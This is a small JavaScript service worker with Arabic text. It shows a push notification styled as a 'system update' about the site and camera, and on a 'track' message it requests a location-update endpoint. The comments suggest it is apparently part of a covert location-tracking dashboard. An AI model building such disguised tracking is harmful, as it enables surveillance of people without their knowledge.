// sw.js
self.addEventListener('push', function(event) {
  const options = {
    body: 'تم تحديث الموقع والكاميرا...',
    icon: 'https://cdn-icons-png.flaticon.com/512/684/684908.png'
  };
  event.waitUntil(
    self.registration.showNotification('تحديث النظام', options)
  );
});

self.addEventListener('message', function(event) {
  // استقبال بيانات الموقع من الداشبورد وإرسالها للصفحة الرئيسية
  if (event.data.type === 'track') {
    fetch('/update_location.php'); // أو أي رابط يعيد البيانات
  }
});